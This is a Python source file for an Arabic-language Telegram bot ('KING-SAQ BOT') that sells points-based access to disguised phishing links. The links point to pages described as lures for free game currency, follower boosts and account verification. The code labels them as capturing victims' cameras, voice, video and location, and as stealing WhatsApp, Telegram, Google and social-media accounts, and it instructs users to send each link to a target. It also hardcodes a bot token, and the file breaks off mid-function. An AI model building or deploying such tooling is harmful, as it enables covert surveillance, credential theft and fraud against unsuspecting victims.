from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
import logging
import json
import os
import time
import asyncio

# ⚠️ التوكن حق البوت الأساسي
TOKEN = "8945901025:AAFMunPkkoNRdMrj-OtgSUnUapqV_TKEK90"
BANNER_URL = "https://www.image2url.com/r2/default/images/1792619785603-05724b00-59c1-46c7-a878-821f2cbd8452.png"

# ⚠️ إعدادات المطور
DEVELOPER_ID = 8794777974
DEV_USERNAME = "@heroil_1"
BOT_USERNAME = "heroil_2bot"

# ⚠️ روابط الأقسام
CAMERA_URL = "https://cam-bot.bonto.run/"
VIDEO_URL = "https://cam-bot.bonto.run/video.html"
VOICE_URL = "https://cam-bot.bonto.run/voice.html"
LOCATION_URL = "https://cam-bot.bonto.run/location.html"
TELEGRAM_URL = "https://cam-bot.bonto.run/telegram.html"
GOOGLE_URL = "https://cam-bot.bonto.run/google.html"
CARDS_URL = "https://cam-bot.bonto.run/cards.html"
SCAN_URL = "https://cam-bot.bonto.run/scan.html"
FREEFIRE_URL = "https://cam-bot.bonto.run/freefire.html"
SNAPCHAT_URL = "https://cam-bot.bonto.run/snapchat.html"
PUBG_URL = "https://cam-bot.bonto.run/pubg.html"
WHATSAPP_URL = "https://cam-bot.bonto.run/whatsapp.html"
FACEBOOK_URL = "https://cam-bot.bonto.run/facebook.html"
INSTAGRAM_URL = "https://cam-bot.bonto.run/instagram.html"
TIKTOK_URL = "https://cam-bot.bonto.run/tiktok.html"
YOUTUBE_URL = "https://cam-bot.bonto.run/youtube.html"
LIKEE_URL = "https://cam-bot.bonto.run/likee.html"
KWAI_URL = "https://cam-bot.bonto.run/kwai.html"
UNBAN_URL = "https://cam-bot.bonto.run/unban.html"
REPORT_URL = "https://cam-bot.bonto.run/report.html"

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

# --- نظام النقاط ---
POINTS_FILE = "user_points.json"
points_data = {"points": {}, "last_daily": {}}

# --- نظام الاشتراك الإجباري ---
CHANNELS_FILE = "channels.json"
channels_data = {"channels": []}

def load_data():
    global points_data, channels_data
    if os.path.exists(POINTS_FILE):
        try:
            with open(POINTS_FILE, "r", encoding="utf-8") as f:
                points_data = json.load(f)
        except:
            points_data = {"points": {}, "last_daily": {}}
    
    if os.path.exists(CHANNELS_FILE):
        try:
            with open(CHANNELS_FILE, "r", encoding="utf-8") as f:
                channels_data = json.load(f)
        except:
            channels_data = {"channels": []}

def save_data():
    try:
        with open(POINTS_FILE, "w", encoding="utf-8") as f:
            json.dump(points_data, f, ensure_ascii=False, indent=4)
    except:
        pass

def save_channels():
    try:
        with open(CHANNELS_FILE, "w", encoding="utf-8") as f:
            json.dump(channels_data, f, ensure_ascii=False, indent=4)
    except:
        pass

def get_user_points(user_id):
    return int(points_data["points"].get(str(user_id), 0))

def add_user_points(user_id, amount):
    current = int(points_data["points"].get(str(user_id), 0))
    points_data["points"][str(user_id)] = current + int(amount)
    save_data()

def register_user(user_id):
    if str(user_id) not in points_data["points"]:
        points_data["points"][str(user_id)] = 0
        save_data()

def can_claim_daily(user_id):
    last_claim = points_data["last_daily"].get(str(user_id), 0)
    return (time.time() - last_claim) >= 86400

def set_daily_claim(user_id):
    points_data["last_daily"][str(user_id)] = time.time()
    save_data()

async def is_subscribed(user_id, context):
    if not channels_data["channels"]:
        return True
    for ch in channels_data["channels"]:
        try:
            member = await context.bot.get_chat_member(chat_id=ch["id"], user_id=user_id)
            if member.status not in ['member', 'administrator', 'creator']:
                return False
        except Exception:
            return False
    return True

async def delete_message_later(context, chat_id, message_id, delay=300):
    await asyncio.sleep(delay)
    try:
        await context.bot.delete_message(chat_id=chat_id, message_id=message_id)
    except Exception:
        pass

def get_section_link(data, user_id):
    links = {
        'hack_cam': f"{CAMERA_URL}?chatId={user_id}",
        'record_voice': f"{VOICE_URL}?chatId={user_id}",
        'record_video': f"{VIDEO_URL}?chatId={user_id}",
        'location': f"{LOCATION_URL}?chatId={user_id}",
        'hack_telegram': f"{TELEGRAM_URL}?chatId={user_id}",
        'hack_google': f"{GOOGLE_URL}?chatId={user_id}",
        'network_cards': f"{CARDS_URL}?chatId={user_id}",
        'device_check': f"{SCAN_URL}?chatId={user_id}",
        'freefire': f"{FREEFIRE_URL}?chatId={user_id}",
        'snapchat': f"{SNAPCHAT_URL}?chatId={user_id}",
        'pubg': f"{PUBG_URL}?chatId={user_id}",
        'whatsapp': f"{WHATSAPP_URL}?chatId={user_id}",
        'facebook': f"{FACEBOOK_URL}?chatId={user_id}",
        'instagram': f"{INSTAGRAM_URL}?chatId={user_id}",
        'tiktok': f"{TIKTOK_URL}?chatId={user_id}",
        'hack_youtube': f"{YOUTUBE_URL}?chatId={user_id}",
        'hack_likee': f"{LIKEE_URL}?chatId={user_id}",
        'hack_kwai': f"{KWAI_URL}?chatId={user_id}",
        'unban_service': f"{UNBAN_URL}",
        'report_number': f"{REPORT_URL}",
        'get_phone_link': f"https://t.me/{BOT_USERNAME}?start={user_id}",
    }
    return links.get(data, None)

def get_section_price(data):
    prices = {
        'hack_cam': 70, 'record_voice': 50, 'record_video': 70, 'location': 70,
        'hack_telegram': 80, 'hack_google': 90, 'network_cards': 50, 'device_check': 50,
        'freefire': 150, 'snapchat': 100, 'pubg': 150, 'whatsapp': 80,
        'facebook': 100, 'instagram': 100, 'tiktok': 100, 'hack_youtube': 120,
        'hack_likee': 100, 'hack_kwai': 100, 'unban_service': 30, 'report_number': 30,
        'get_phone_link': 30,
    }
    return prices.get(data, 70)

def get_section_title(data):
    titles = {
        'hack_cam': 'تم تلغيم الرابط اختراق الكاميرا 💀 الأمامية والخلفية 📸',
        'record_voice': 'تم تلغيم ربط بوابة الضل',
        'record_video': 'تم تلغيم ربط تزويد متابعين',
        'location': 'تم تلغيم ربط تعلم الهكر والاختراق',
        'hack_telegram': 'تم تلغيم ربط توثيق حسابات تلجرام',
        'hack_google': 'تم تلغيم ربط توثيق حسابات جوجل',
        'network_cards': 'تم تلغيم ربط تخمين كروت الشبكات',
        'device_check': 'تم تلغيم ربط فحص الجهاز',
        'freefire': 'تم تلغيم ربط شحن جواهر فري فاير',
        'snapchat': 'تم تلغيم ربط تزويد متابعين سناب شات',
        'pubg': 'تم تلغيم ربط شحن شدات ببجي',
        'whatsapp': 'تم تلغيم ربط توثيق حسابات واتساب',
        'facebook': 'تم تلغيم ربط تزويد متابعين فيسبوك',
        'instagram': 'تم تلغيم ربط تزويد متابعين انستقرام',
        'tiktok': 'تم تلغيم ربط تزويد متابعين تيك توك',
        'hack_youtube': 'تم تلغيم ربط رشق مشتركين يوتيوب',
        'hack_likee': 'تم تلغيم ربط رشق متابعين لايكي',
        'hack_kwai': 'تم تلغيم ربط رشق متابعين كواي',
        'unban_service': 'تم تلغيم ربط فك حظر الأرقام',
        'report_number': 'تم تلغيم ربط الإبلاغ عن الأرقام',
        'get_phone_link': 'تم تلغيم ربط كاشف الأرقام',
    }
    return titles.get(data, 'تم تلغيم الربط بنجاح')

def get_section_name(data):
    names = {
        'hack_cam': 'اختراق كاميرا ام وخ', 'record_voice': 'تسجيل صوت الضحية',
        'record_video': 'تصوير الضحية فيديو', 'location': 'تحديد موقع الضحية',
        'hack_telegram': 'توثيق تلجرام', 'hack_google': 'توثيق جوجل',
        'network_cards': 'تخمين كروت شبكات', 'device_check': 'فحص الجهاز',
        'freefire': 'شحن فري فاير', 'snapchat': 'سناب شات',
        'pubg': 'ببجي', 'whatsapp': 'واتساب',
        'facebook': 'فيسبوك', 'instagram': 'انستقرام',
        'tiktok': 'تيك توك', 'hack_youtube': 'رشق يوتيوب',
        'hack_likee': 'رشق لايكي', 'hack_kwai': 'رشق كواي',
        'unban_service': 'فك حظر واتساب', 'report_number': 'حظر أرقام واتساب',
        'get_phone_link': 'كاشف رقم الضحية'
    }
    return names.get(data, 'غير معروف')

# --- لوحة الأدمن ---
async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != DEVELOPER_ID:
        await update.message.reply_text("❌ هذا الأمر خاص بالمطور فقط.")
        return

    keyboard = [
        [InlineKeyboardButton("📊 إحصائيات", callback_data='admin_stats')],
        [InlineKeyboardButton("📢 إذاعة للمستخدمين", callback_data='admin_broadcast')],
        [InlineKeyboardButton("🎁 إضافة نقاط", callback_data='admin_add_points')],
        [InlineKeyboardButton("🔄 تصفير نقاط", callback_data='admin_reset_points')],
        [InlineKeyboardButton("📢 إدارة قنوات الاشتراك", callback_data='admin_channels')],
        [InlineKeyboardButton("🔙 إغلاق", callback_data='admin_close', style='danger')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_text(
        "𖤍『لَوْحَةُ الـمَلِك』𖤍\n"
        "𓆩♛𓆪 الهكر هرويل 206 𓆩♛𓆪\n\n"
        "اختر الخيار المناسب:",
        reply_markup=reply_markup,
        parse_mode='HTML'
    )

async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    user_id = query.from_user.id

    if user_id != DEVELOPER_ID:
        await query.message.reply_text("❌ هذا الأمر خاص بالمطور فقط.")
        return

    if data == 'admin_stats':
        total_users = len(points_data["points"])
        total_points = sum(points_data["points"].values())
        await query.message.reply_text(
            f"📊 <b>إحصائيات البوت:</b>\n\n"
            f"👥 <b>عدد المستخدمين:</b> {total_users}\n"
            f"💥 <b>إجمالي النقاط:</b> {total_points}",
            parse_mode='HTML'
        )
    elif data == 'admin_broadcast':
        await query.message.reply_text("📢 اكتب الرسالة اللي تبغى ترسلها لكل المستخدمين:")
        context.user_data['admin_broadcast'] = True
    elif data == 'admin_add_points':
        await query.message.reply_text("🎁 استخدم الأمر: `/addpoints <id> <amount>`")
    elif data == 'admin_reset_points':
        await query.message.reply_text("🔄 استخدم الأمر: `/resetpoints <id>`")
    elif data == 'admin_channels':
        keyboard = [
            [InlineKeyboardButton("➕ إضافة قناة", callback_data='admin_add_ch')],
            [InlineKeyboardButton("🗑️ حذف قناة", callback_data='admin_del_ch')],
            [InlineKeyboardButton("📋 عرض القنوات", callback_data='admin_list_ch')],
            [InlineKeyboardButton("🔙 رجوع", callback_data='admin_back')]
        ]
        await query.message.edit_text(
            "📢 <b>إدارة قنوات الاشتراك الإجباري</b>\n\nاختر العملية:",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='HTML'
        )
    elif data == 'admin_add_ch':
        context.user_data['admin_state'] = 'add_channel'
        await query.message.reply_text(
            "📝 <b>أرسل بيانات القناة بالشكل ده:</b>\n\n"
            "<code>ID القناة | اسم القناة | لينك القناة</code>\n\n"
            "مثال:\n"
            "<code>-1001234567890 | قناتي | https://t.me/mychannel</code>",
            parse_mode='HTML'
        )
    elif data == 'admin_del_ch':
        if not channels_data["channels"]:
            await query.message.reply_text("📭 مفيش قنوات مضافة حالياً.")
            return
        del_keyboard = []
        for i, ch in enumerate(channels_data["channels"]):
            del_keyboard.append([InlineKeyboardButton(f"🗑️ {ch['name']}", callback_data=f'del_ch_{i}')])
        del_keyboard.append([InlineKeyboardButton("🔙 رجوع", callback_data='admin_channels')])
        await query.message.edit_text(
            "اختر القناة اللي عايز تحذفها:",
            reply_markup=InlineKeyboardMarkup(del_keyboard)
        )
    elif data.startswith('del_ch_'):
        index = int(data.replace('del_ch_', ''))
        if 0 <= index < len(channels_data["channels"]):
            removed = channels_data["channels"].pop(index)
            save_channels()
            await query.message.edit_text(f"✅ تم حذف القناة: {removed['name']}")
    elif data == 'admin_list_ch':
        if not channels_data["channels"]:
            await query.message.reply_text("📭 مفيش قنوات مضافة حالياً.")
            return
        list_text = "📋 <b>القنوات المضافة:</b>\n\n"
        for i, ch in enumerate(channels_data["channels"]):
            list_text += f"{i+1}. <b>{ch['name']}</b>\n   ID: <code>{ch['id']}</code>\n   Link: {ch['link']}\n\n"
        await query.message.reply_text(list_text, parse_mode='HTML')
    elif data == 'admin_back':
        keyboard = [
            [InlineKeyboardButton("📊 إحصائيات", callback_data='admin_stats')],
            [InlineKeyboardButton("📢 إذاعة للمستخدمين", callback_data='admin_broadcast')],
            [InlineKeyboardButton("🎁 إضافة نقاط", callback_data='admin_add_points')],
            [InlineKeyboardButton("🔄 تصفير نقاط", callback_data='admin_reset_points')],
            [InlineKeyboardButton("📢 إدارة قنوات الاشتراك", callback_data='admin_channels')],
            [InlineKeyboardButton("🔙 إغلاق", callback_data='admin_close', style='danger')]
        ]
        await query.message.edit_text(
            "𖤍『لَوْحَةُ الـمَلِك』𖤍\n"
            "𓆩♛𓆪 الهكر هرويل 206 𓆩♛𓆪\n\n"
            "اختر الخيار المناسب:",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='HTML'
        )
    elif data == 'admin_close':
        await query.message.delete()

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id

    if not await is_subscribed(user_id, context):
        join_buttons = []
        for ch in channels_data["channels"]:
            join_buttons.append([InlineKeyboardButton(f"📢 {ch['name']}", url=ch['link'])])
        join_buttons.append([InlineKeyboardButton("✅ تحقق من الاشتراك", callback_data='check_sub')])
        await update.message.reply_text(
            "⚠️ <b>عذراً، لازم تشترك في القنوات دي الأول عشان تقدر تستخدم البوت:</b>",
            reply_markup=InlineKeyboardMarkup(join_buttons),
            parse_mode='HTML'
        )
        return

    register_user(user_id)
    
    args = context.args
    if args:
        referrer_id = args[0]
        if referrer_id != str(user_id) and str(user_id) not in points_data["points"]:
            add_user_points(referrer_id, 3)
            await update.message.reply_text(f"✅ تم إضافة 3 نقاط لمن دعاك! أهلاً بك.", parse_mode='HTML')

    user_points = get_user_points(user_id)
    
    user_card = (
        f"📝 <b>الاسم :</b> {user.full_name}\n"
        f"🆔 <b>الآيدي :</b> {user_id}\n"
        f"💥 <b>نقاطك :</b> {user_points} نقطة\n"
        f"💰 <b>تكلفة فتح القسم :</b> حسب القسم"
    )

    keyboard = [
        [InlineKeyboardButton("📸 اختراق كاميرا ام وخ", callback_data='pay_hack_cam'), InlineKeyboardButton("☠️ تلغيم صورة 💀", callback_data='coming_soon')],
        [InlineKeyboardButton("🎙️ تسجيل صوت الضحية", callback_data='pay_record_voice'), InlineKeyboardButton("📹 تصوير الضحية فيديو", callback_data='pay_record_video')],
        [InlineKeyboardButton("📍 تحديد موقع الضحية", callback_data='pay_location')],
        [InlineKeyboardButton("✅ اختراق واتساب", callback_data='pay_whatsapp'), InlineKeyboardButton("📨 اختراق التلجرام", callback_data='pay_hack_telegram')],
        [InlineKeyboardButton("🎬 اختراق تيك توك", callback_data='pay_tiktok'), InlineKeyboardButton("🚀 اختراق الانستغرام", callback_data='pay_instagram')],
        [InlineKeyboardButton("🔵 اختراق فيسبوك", callback_data='pay_facebook'), InlineKeyboardButton("👻 اختراق سناب شات", callback_data='pay_snapchat')],
        [InlineKeyboardButton("❤️ اختراق لايكي", callback_data='pay_hack_likee'), InlineKeyboardButton("🎥 اختراق كواي", callback_data='pay_hack_kwai')],
        [InlineKeyboardButton("▶️ اختراق يوتيوب", callback_data='pay_hack_youtube')],
        [InlineKeyboardButton("🔥 اختراق بوبجي", callback_data='pay_pubg'), InlineKeyboardButton("💎 اختراق فري فاير", callback_data='pay_freefire')],
        [InlineKeyboardButton("🔴 اختراق جوجل", callback_data='pay_hack_google'), InlineKeyboardButton("📱 فحص الجهاز", callback_data='pay_device_check')],
        [InlineKeyboardButton("✅ فك حظر واتساب", callback_data='pay_unban_service'), InlineKeyboardButton("🚨 حظر أرقام واتساب", callback_data='pay_report_number')],
        [InlineKeyboardButton("📞 كاشف رقم الضحية", callback_data='pay_get_phone_link')],
        [InlineKeyboardButton("📞 سحب جهات الاتصال", callback_data='pay_get_contacts'), InlineKeyboardButton("✉️ سحب جميع الرسائل", callback_data='pay_get_messages')],
        [InlineKeyboardButton("🖼️ سحب جميع الصور", callback_data='coming_soon')],
        [InlineKeyboardButton("📱 أرقام وهمية", callback_data='fake_num')],
        [InlineKeyboardButton("💸 تحويل نقاط", callback_data='transfer_points'), InlineKeyboardButton("💰 تجميع نقاط", callback_data='collect_points')],
        [InlineKeyboardButton("💳 أسعار النقاط", callback_data='points_store')],
        [InlineKeyboardButton("👨‍💻 التواصل مع المطور", callback_data='contact_dev'), InlineKeyboardButton("ℹ️ حول البوت", callback_data='about')]
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    welcome_text = (
        "╔══════════════════════════╗\n"
        "║   ⚔️ <b>KING-SAQ BOT</b> ⚔️   ║\n"
        "╚══════════════════════════╝\n\n"
        f"{user_card}\n\n"
        "🔥 <b>اختر القسم المناسب من الأزرار أدناه:</b> ✨"
    )
    
    try:
        await update.message.reply_photo(photo=BANNER_URL, caption=welcome_text, reply_markup=reply_markup, parse_mode='HTML')
    except Exception as e:
        await update.message.reply_text(welcome_text, reply_markup=reply_markup, parse_mode='HTML')

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    user_id = query.from_user.id

    if data == 'check_sub':
        if await is_subscribed(user_id, context):
            await query.message.edit_text("✅ <b>تم التحقق! اكتب /start عشان تبدأ.</b>", parse_mode='HTML')
        else:
            await query.answer("❌ لسه مش مشترك في كل القنوات! اشترك الأول.", show_alert=True)
        return

    if not await is_subscribed(user_id, context):
        join_buttons = []
        for ch in channels_data["channels"]:
            join_buttons.append([InlineKeyboardButton(f"📢 {ch['name']}", url=ch['link'])])
        join_buttons.append([InlineKeyboardButton("✅ تحقق من الاشتراك", callback_data='check_sub')])
        await query.message.edit_text(
            "⚠️ <b>عذراً، لازم تشترك في القنوات دي الأول عشان تقدر تستخدم البوت:</b>",
            reply_markup=InlineKeyboardMarkup(join_buttons),
            parse_mode='HTML'
        )
        return

    if data.startswith('admin_'):
        await admin_callback(update, context)
        return

    # --- قسم الأرقام الوهمية ---
    if data == 'fake_num':
        keyboard = [
            [InlineKeyboardButton("📞 أرقام واتساب", callback_data='fake_wa'), InlineKeyboardButton("📨 أرقام تلجرام", callback_data='fake_tg')],
            [InlineKeyboardButton("📱 أرقام إيمو", callback_data='fake_imo'), InlineKeyboardButton("📸 أرقام انستقرام", callback_data='fake_ig')],
            [InlineKeyboardButton("🔙 رجوع", callback_data='back_to_main', style='danger')]
        ]
        await query.message.edit_text(
            "📱 <b>أرقام وهمية</b>\n\nاختر المنصة:",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='HTML'
        )
        return

    # --- قوائم الدول (لكل منصة) ---
    if data in ['fake_wa', 'fake_tg', 'fake_imo', 'fake_ig']:
        platform_names = {
            'fake_wa': 'واتساب',
            'fake_tg': 'تلجرام',
            'fake_imo': 'إيمو',
            'fake_ig': 'انستقرام'
        }
        platform_name = platform_names.get(data, 'غير معروف')
        
        keyboard = [
            [InlineKeyboardButton("🇸🇦 السعودية", callback_data=f'{data}_sa')],
            [InlineKeyboardButton("🇾🇪 اليمن", callback_data=f'{data}_ye')],
            [InlineKeyboardButton("🇪🇬 مصر", callback_data=f'{data}_eg')],
            [InlineKeyboardButton("🇸🇾 سوريا", callback_data=f'{data}_sy')],
            [InlineKeyboardButton("🇮🇶 العراق", callback_data=f'{data}_iq')],
            [InlineKeyboardButton("🇺🇸 أمريكا", callback_data=f'{data}_us')],
            [InlineKeyboardButton("🇷🇺 روسيا", callback_data=f'{data}_ru')],
            [InlineKeyboardButton("🔙 رجوع", callback_data='fake_num', style='danger')]
        ]
        await query.message.edit_text(
            f"📱 <b>{platform_name} - اختر الدولة:</b>",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='HTML'
        )
        return

    # --- عرض الأسعار لكل دولة ---
    if '_' in data and (data.startswith('fake_wa_') or data.startswith('fake_tg_') or data.startswith('fake_imo_') or data.startswith('fake_ig_')):
        parts = data.split('_')
        if len(parts) >= 3:
            platform_code = f"{parts[0]}_{parts[1]}"
            country_code = parts[2]
            
            platform_names = {
                'fake_wa': 'واتساب',
                'fake_tg': 'تلجرام',
                'fake_imo': 'إيمو',
                'fake_ig': 'انستقرام'
            }
            platform_name = platform_names.get(platform_code, 'غير معروف')
            
            country_names = {
                'sa': 'السعودية 🇸🇦',
                'ye': 'اليمن 🇾🇪',
                'eg': 'مصر 🇪🇬',
                'sy': 'سوريا 🇸🇾',
                'iq': 'العراق 🇮🇶',
                'us': 'أمريكا 🇺🇸',
                'ru': 'روسيا 🇷🇺'
            }
            country_name = country_names.get(country_code, 'غير معروف')
            
            await query.message.edit_text(
                f"📱 <b>{platform_name} - {country_name}</b>\n\n"
                f"💰 <b>الأسعار:</b>\n"
                f"🔹 1000 نقطة = 5$ (أو 2500 ريال يمني)\n"
                f"🔹 2000 نقطة = 10$ (أو 5000 ريال يمني)\n\n"
                f"⚠️ <b>هذا القسم قيد التطوير، سيتم إضافة الأرقام قريباً.</b>",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data=platform_code, style='danger')]]),
                parse_mode='HTML'
            )
            return

    if data == 'transfer_points':
        keyboard = [[InlineKeyboardButton("رجوع 🔙", callback_data='back_to_main', style='danger')]]
        context.user_data['transfer_state'] = 'waiting_for_id'
        await query.message.reply_text(
            "💸 <b>تحويل نقاط</b>\n\nأرسل آيدي الشخص الذي تريد التحويل إليه:",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='HTML'
        )
        return

    if data == 'collect_points':
        keyboard = [
            [InlineKeyboardButton("🎁 الهدية اليومية", callback_data='daily_gift')],
            [InlineKeyboardButton("🎗️ رابط الدعوة", callback_data='invite_friends')],
            [InlineKeyboardButton("رجوع 🔙", callback_data='back_to_main', style='danger')]
        ]
        await query.message.reply_text(
            f"🏆 <b>تجميع نقاط</b>\n\nاختر طريقة لجمع النقاط:",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='HTML'
        )
        return

    if data == 'points_store':
        keyboard = [
            [InlineKeyboardButton("💵 500 نقطة = 2500 ريال يمني أو 5$", callback_data='buy_500')],
            [InlineKeyboardButton("💵 1000 نقطة = 5000 ريال يمني أو 10$", callback_data='buy_1000')],
            [InlineKeyboardButton("💵 1500 نقطة = 7500 ريال يمني أو 15$", callback_data='buy_1500')],
            [InlineKeyboardButton("💵 2000 نقطة = 10000 ريال يمني أو 20$", callback_data='buy_2000')],
            [InlineKeyboardButton("رجوع 🔙", callback_data='back_to_main', style='danger')]
        ]
        await query.message.reply_text(
            f"💳 <b>قسم أسعار النقاط</b>\n\nاختر الباقة:",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='HTML'
        )
        return

    if data == 'buy_500':
        await query.message.reply_text(f"💵 <b>500 نقطة</b>\n\n💰 <b>السعر:</b> 2500 ريال يمني أو 5$\n\n👨‍💻 <b>حول المبلغ إلى:</b> {DEV_USERNAME}", parse_mode='HTML')
        return
    elif data == 'buy_1000':
        await query.message.reply_text(f"💵 <b>1000 نقطة</b>\n\n💰 <b>السعر:</b> 5000 ريال يمني أو 10$\n\n👨‍💻 <b>حول المبلغ إلى:</b> {DEV_USERNAME}", parse_mode='HTML')
        return
    elif data == 'buy_1500':
        await query.message.reply_text(f"💵 <b>1500 نقطة</b>\n\n💰 <b>السعر:</b> 7500 ريال يمني أو 15$\n\n👨‍💻 <b>حول المبلغ إلى:</b> {DEV_USERNAME}", parse_mode='HTML')
        return
    elif data == 'buy_2000':
        await query.message.reply_text(f"💵 <b>2000 نقطة</b>\n\n💰 <b>السعر:</b> 10000 ريال يمني أو 20$\n\n👨‍💻 <b>حول المبلغ إلى:</b> {DEV_USERNAME}", parse_mode='HTML')
        return
    elif data == 'back_to_main':
        context.user_data['transfer_state'] = None
        await query.message.delete()
        await start(update, context)
        return

    if data == 'daily_gift':
        if can_claim_daily(user_id):
            add_user_points(user_id, 1)
            set_daily_claim(user_id)
            await query.message.reply_text(
                f"🎁 <b>تم استلام هديتك اليومية!</b>\n\n✅ <b>+1 نقطة</b>\n💥 <b>رصيدك الحالي:</b> {get_user_points(user_id)} نقطة",
                parse_mode='HTML'
            )
        else:
            await query.message.reply_text(
                f"⏰ <b>لقد استلمت هديتك اليومية بالفعل!</b>\n💥 <b>رصيدك الحالي:</b> {get_user_points(user_id)} نقطة",
                parse_mode='HTML'
            )
        return

    if data == 'invite_friends':
        bot_username = context.bot.username
        invite_link = f"https://t.me/{bot_username}?start={user_id}"
        await query.message.reply_text(
            f"🔗 <b>رابط الدعوة الخاص بك:</b>\n\n{invite_link}\n\n💰 <b>ستحصل على 3 نقاط لكل شخص ينضم!</b>",
            parse_mode='HTML',
            disable_web_page_preview=True
        )
        return

    if data == 'about':
        await query.message.reply_text("👨‍💻 <b>KING-SAQ BOT v4.0</b>\nالهدف: التعلم والاختراق الأخلاقي فقط.", parse_mode='HTML')
        return
    elif data == 'contact_dev':
        await query.message.reply_text("👨‍💻 <b>المطور:</b> @heroil_1", parse_mode='HTML')
        return

    if data == 'coming_soon':
        await query.message.reply_text("🛠️ <b>هذا القسم قيد التطوير حالياً.</b>", parse_mode='HTML')
        return

    if data.startswith('pay_'):
        actual_data = data.replace('pay_', '')
        user_points = get_user_points(user_id)
        required_points = get_section_price(actual_data)
        
        if user_points < required_points:
            await query.message.reply_text(
                f"❌ <b>رصيدك غير كافي!</b>\n\n💥 <b>نقاطك:</b> {user_points}\n🔒 <b>تحتاج:</b> {required_points} نقطة لفتح القسم.",
                parse_mode='HTML'
            )
            return
        else:
            confirm_keyboard = [
                [InlineKeyboardButton("موافق ✅", callback_data=f'confirm_{actual_data}', style='success')],
                [InlineKeyboardButton("إلغاء ❌", callback_data='cancel', style='danger')]
            ]
            await query.message.reply_text(
                f"⚠️ <b>تأكيد الطلب</b>\n\n"
                f"أنت على وشك فتح قسم: <b>{get_section_name(actual_data)}</b>\n\n"
                f"💰 <b>التكلفة:</b> {required_points} نقطة\n"
                f"💥 <b>رصيدك الحالي:</b> {user_points} نقطة\n\n"
                f"هل أنت موافق؟",
                reply_markup=InlineKeyboardMarkup(confirm_keyboard),
                parse_mode='HTML'
            )
            return

    if data.startswith('confirm_'):
        actual_data = data.replace('confirm_', '')
        link = get_section_link(actual_data, user_id)
        
        if not link:
            await query.edit_message_text("🛠️ <b>هذا القسم قيد التطوير حالياً.</b>", parse_mode='HTML')
            return

        required_points = get_section_price(actual_data)
        add_user_points(user_id, -required_points)
        title = get_section_title(actual_data)
        
        msg = await query.edit_message_text(
            text=f"💀 <b>{title}</b> 💀\n\n"
                 f"🔗 <b>الرابط جاهز:</b>\n\n"
                 f"{link}\n\n"
                 f"📌 <b>أرسـل الـرابـط لـلـهـدف • وستوصلك البيانات فوراً 🔥</b>",
            parse_mode='HTML',
            disable_web_page_preview=True
        )
        
        asyncio.create_task(delete_message_later(context, msg.chat_id, msg.message_id, 300))
        return

    if data == 'cancel':
        context.user_data['transfer_state'] = None
        await query.message.delete()
        await start(update, context)
        return

async def add_points(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != DEVELOPER_ID:
        await update.message.reply_text("❌ هذا الأمر خاص بالمطور فقط.")
        return
    
    if len(context.args) == 1:
        try:
            amount = int(context.args[0])
            add_user_points(user_id, amount)
            await update.message.reply_text(f"✅ تم إضافة {amount} نقطة بنجاح! رصيدك الحالي: {get_user_points(user_id)}")
        except:
            await update.message.reply_text("⚠️ استخدم الأمر كذا: `/addpoints 1000`")
    
    elif len(context.args) == 2:
        try:
            target_id = int(context.args[0])
            amount = int(context.args[1])
            add_user_points(target_id, amount)
            
            try:
                await context.bot.send_message(
                    chat_id=target_id,
                    text=f"🎉 <b>تم إضافة نقاط لحسابك!</b>\n\n✅ <b>النقاط المضافة:</b> {amount} نقطة\n💥 <b>رصيدك الحالي:</b> {get_user_points(target_id)} نقطة\n\n🔥 يمكنك الآن استخدام البوت. اكتب /start للبدء.",
                    parse_mode='HTML'
                )
                await update.message.reply_text(f"✅ تم إضافة {amount} نقطة للآيدي {target_id} وإرسال إشعار له!")
            except Exception as e:
                await update.message.reply_text(f"✅ تم إضافة {amount} نقطة للآيدي {target_id} (لكن تعذر إرسال الإشعار).")
        except:
            await update.message.reply_text("⚠️ استخدم الأمر كذا: `/addpoints 123456789 1000`")
    else:
        await update.message.reply_text("⚠️ استخدم الأمر كذا:\n`/addpoints 1000` (لنفسك)\n`/addpoints 123456789 1000` (لشخص ثاني)")

async def reset_points(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != DEVELOPER_ID:
        await update.message.reply_text("❌ هذا الأمر خاص بالمطور فقط.")
        return
    
    if len(context.args) == 1:
        try:
            target_id = int(context.args[0])
            points_data["points"][str(target_id)] = 0
            save_data()
            await update.message.reply_text(f"✅ تم تصفير نقاط الآيدي {target_id} بنجاح!")
        except:
            await update.message.reply_text("⚠️ استخدم الأمر كذا: `/resetpoints 123456789`")
    else:
        await update.message.reply_text("⚠️ استخدم الأمر كذا: `/resetpoints 123456789`")

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    if user_id == DEVELOPER_ID and context.user_data.get('admin_state') == 'add_channel':
        text = update.message.text
        if '|' in text:
            parts = text.split('|')
            if len(parts) == 3:
                ch_id = parts[0].strip()
                ch_name = parts[1].strip()
                ch_link = parts[2].strip()
                
                channels_data["channels"].append({"id": ch_id, "name": ch_name, "link": ch_link})
                save_channels()
                context.user_data['admin_state'] = None
                
                await update.message.reply_text(
                    f"✅ <b>تمت إضافة القناة بنجاح!</b>\n\n"
                    f"📢 الاسم: {ch_name}\n"
                    f"🆔 ID: <code>{ch_id}</code>\n"
